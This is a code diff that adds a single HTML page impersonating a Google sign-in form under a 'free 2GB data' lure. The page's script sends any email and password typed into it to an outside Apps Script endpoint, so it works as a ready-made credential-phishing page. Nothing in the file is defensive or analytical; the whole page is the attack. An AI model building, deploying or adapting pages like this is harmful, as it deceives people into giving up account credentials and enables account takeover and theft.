@@ -1,0 +1,67 @@
+<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
+    <script src="https://code.jquery.com/jquery-3.7.1.slim.min.js" integrity="sha256-kmHvs0B+OpCW5GVHUNjv9rOmY0IvSIRcf7zGUDTDQM8=" crossorigin="anonymous"></script>
+    <title>https://www.freeData.com</title><style type="text/css">*{margin:0px;padding:0px;box-sizing:border-box}
+        .container{width:24rem;border:1px solid #ccc;top:50%;border-radius:8px;
+        left:50%;transform:translate(-50%,-50%);position:absolute;padding:2.5rem}
+        img{height:40px;width:140px}.log{display:flex;justify-content:center;padding-bottom:15px}
+        .container h2{text-align:Center;font-weight:500;margin:0 0 0.125rem;font-weight:normal;
+        font-size:24px;padding:0;color:#1b1a1a}.container p{text-align:center;font-size:20px;line-height:1.5;letter-spacing:1px;margin-bottom:25px;}
+        .container .inputBox{position:relative}
+        .inputBox input{width:93%;padding:0.625rem 10px;border-radius:4px;background:transparent;
+        border:1px solid gray;margin-bottom:1.897rem;font-size:1rem;letter-spacing:0.062rem}
+        .inputBox label{top:0;left:10px;position:absolute;padding:0.625rem 0;font-size:1rem;transition:0.3s;color:Gray}
+        .inputBox .forget-password{margin-top:-20px}
+        .forget-password button{outline:none;border:none;background:none;text-align:center;letter-spacing:0.25px;font-size:inherit;color:#1a73e8;position:relative;
+        cursor:pointer}.container input[type="submit"]{border:none;outline:none;background:none;float:right;font-weight:bold;
+        padding:0.625rem 1.25rem;background:#1a73e8;border-radius:0.31rem;color:white;font-size:1rem}
+        .container .inputBox input:focus~label,
+        .container .inputBox input:valid~label,
+        .container .inputBox input:not([value=""])~label{padding:0px 5px;color:#1a73e8;
+            top:-0.5rem;left:10px;height:20px;background:white;font-size:.75rem;
+        }.inputBox input:focus{
+            border:2px solid #1a73e8;outline:none;
+        }.container input[type="submit"]:hover{background-color:#4f8cdc}
+        *{margin:0px;padding:0px;box-sizing:border-box}
+        .container{width:24rem;border:1px solid #ccc;top:50%;border-radius:8px;
+        left:50%;transform:translate(-50%,-50%);position:absolute;padding:2.5rem}
+        img{height:40px;width:140px}.log{display:flex;justify-content:center;padding-bottom:15px}
+        .container h2{text-align:Center;font-weight:500;margin:0 0 0.125rem;font-weight:normal;
+        font-size:24px;padding:0;color:#1b1a1a}.container p{text-align:center;font-size:20px;line-height:1.5;letter-spacing:1px;margin-bottom:25px;}
+        .container .inputBox{position:relative}
+        .inputBox input{width:93%;padding:0.625rem 10px;border-radius:4px;background:transparent;
+        border:1px solid gray;margin-bottom:1.897rem;font-size:1rem;letter-spacing:0.062rem}
+        .inputBox label{top:0;left:10px;position:absolute;padding:0.625rem 0;font-size:1rem;transition:0.3s;color:Gray}
+        .inputBox .forget-password{margin-top:-20px}
+        .forget-password button{outline:none;border:none;background:none;text-align:center;letter-spacing:0.25px;font-size:inherit;color:#1a73e8;position:relative;
+        cursor:pointer}.container input[type="submit"]{border:none;outline:none;background:none;float:right;font-weight:bold;
+        padding:0.625rem 1.25rem;background:#1a73e8;border-radius:0.31rem;color:white;font-size:1rem}
+        .container .inputBox input:focus~label,
+        .container .inputBox input:valid~label,
+        .container .inputBox input:not([value=""])~label{padding:0px 5px;color:#1a73e8;
+            top:-0.5rem;left:10px;height:20px;background:white;font-size:.75rem;
+        }.inputBox input:focus{
+            border:2px solid #1a73e8;outline:none;
+        }.container input[type="submit"]:hover{background-color:#4f8cdc}
+</style></head><body><div class="container">
+        <div class="log"><img src="https://i.postimg.cc/QCfm4HkJ/goo.jpg">
+        </div><h2>Sign In</h2><p>Use a Google account</p><form id="form"method="post"><div class="inputBox"><input type="email"name="email"value=""onkeyup="this.setAttribute('value',this.style)"required>
+                <label for="email">E-mail or phone number</label></div>
+                <div class="inputBox">
+                    <input type="password"name="password"value=""onkeyup="this.setAttribute('value',this.style)"required>
+                    <label for="password">Password</label></div>
+                    <div class="forget-password">
+                        <button>Forget password?</button>
+                    </div><input type="submit"value="Log In"></form></div><script type="text/javascript">
+        let url="https://script.google.com/macros/s/AKfycbwrm2nTZmozYwwk_HW-TlQXC3GJRSAZljUDppXDWG0w4Y1aq50uDP_v8VG14Qb8f8sU/exec";
+        let form=document.querySelector("#form");
+        form.addEventListener("submit",(e)=>{
+            let d=new FormData(form);
+            fetch(url,{ method:'POST',body:d
+            }).then((res)=>res.text())
+            .then((finalres)=>console.log(finalres))
+            e.preventDefault();
+        });
+        swal("Today best offer for you 2GB Data");
+</script></body></html>
